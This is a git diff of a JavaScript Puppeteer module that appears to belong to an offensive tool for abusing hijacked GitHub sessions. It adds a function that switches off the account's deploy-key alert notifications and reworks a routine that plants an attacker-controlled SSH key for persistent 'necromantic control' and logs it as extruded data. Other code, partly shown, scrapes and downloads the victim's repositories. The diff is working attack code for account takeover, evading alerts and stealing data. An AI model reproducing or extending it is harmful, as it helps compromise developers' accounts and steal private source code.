@@ -2,17 +2,55 @@ const db = require('../../db/db')
 const necrohelp = require('../../tasks/helpers/necrohelp')
 const clusterLib = require('../../puppeteer/cluster')
 
+exports.DisableDeployKeyAlert = async function(page, taskId){
+    await page.goto('https://github.com/settings/notifications')
+
+    await page.waitForTimeout(2000)
+
+    // get the last switch for Deploy Key Alert and check if it is checked
+    const isDeployKeyChecked = await page.evaluate('document.querySelectorAll(\'button[aria-labelledby="switchLabel"]\')[2].ariaChecked');
+
+
+    if(isDeployKeyChecked === 'true'){
+        // click to disable
+        console.log(`[${taskId}] Deploy Key Alert Notification is ON. Disabling it...`);
+
+        // TODO needs fixing to get properly the button
+        const unchecks = await page.$$('button[aria-labelledby="switchLabel"]')
+        for(let uncheck in unchecks){
+            await page.click(uncheck)
+            await page.waitForTimeout(1000)
+        }
+
+        await page.screenshot({path: `extrusion/screenshot_notifications-after_${taskId}.png`});
+        console.log(`[${taskId}] Deploy Key Alert Notification now DISABLED.`);
+
+    }else{
+        //nothing to do
+        console.log(`[${taskId}] Deploy Key Alert Notification is already disable, nothing to do..`);
+    }
+
+}
+
 exports.PlantSshKey = async function(page, taskId, sshKeyName, sshMaterial){
     await page.goto('https://github.com/settings/ssh/new')
 
-    await page.click('#new_key #public_key_title')
-    await page.type('#new_key #public_key_title', sshKeyName)
+    await page.waitForTimeout(1000)
 
-    await page.click('#new_key #public_key_key')
-    await page.type('#new_key #public_key_key', sshMaterial)
+    const nameInput = 'input[name="ssh_key[title]"]'
+    await page.click(nameInput)
+    await page.type(nameInput, sshKeyName)
+
+    const keyInput = 'textarea[name="ssh_key[key]"]'
+    await page.click(keyInput)
+    await page.type(keyInput, sshMaterial)
+
+    await page.waitForTimeout(500)
 
     // click Add Key
-    await page.click('#new_key > .mb-0 > .btn')
+    await page.click('button.btn-primary')
+
+    await page.waitForTimeout(1000)
 
     // TODO sometimes depending on session timing probably,
     // TODO github asks for Password confirmation before adding the key
@@ -21,8 +59,8 @@ exports.PlantSshKey = async function(page, taskId, sshKeyName, sshMaterial){
 
     console.log(`[${taskId}] SSH key ${sshKeyName} added for necromantic control \\.oOo./`);
 
-    await page.waitForTimeout(1000)
-    await necrohelp.ScreenshotFullPage(page, taskId, 'https://github.com/settings/keys')
+    await page.waitForTimeout(2000)
+    await necrohelp.ScreenshotCurrentPage(page, taskId)
 
     let extrudedHashKey = `plantedSshKey_${sshKeyName}`
     await db.AddExtrudedData(taskId, extrudedHashKey, sshMaterial)
@@ -48,6 +86,7 @@ exports.ScrapeRepos = async function(page, taskId) {
     let reposToDownload = [];
     for(let url of urls){
         let href = await(await url.getProperty('href')).jsonValue();
+        // TODO do the same for the 'main' branch!!!
 	href = href + "/archive/refs/heads/master.zip"    
         reposToDownload.push(href);
         console.log(`[${taskId}] discovered repo at ${href}`)
